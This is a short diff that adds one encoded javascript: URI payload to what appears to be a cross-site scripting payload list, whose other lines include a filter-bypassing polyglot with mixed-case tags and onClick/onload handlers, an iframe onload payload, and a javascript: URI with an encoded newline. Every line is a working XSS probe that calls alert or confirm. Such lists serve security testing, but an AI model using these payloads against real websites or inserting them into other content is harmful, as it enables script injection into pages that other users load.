@@ -1,3 +1,4 @@
+%26%2302java%26%23115cript:alert(document.domain)
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 <iframe/onload=aaajavascipt:alert(1)>
 JavaScript://%250Dtop.confirm(1)//?1
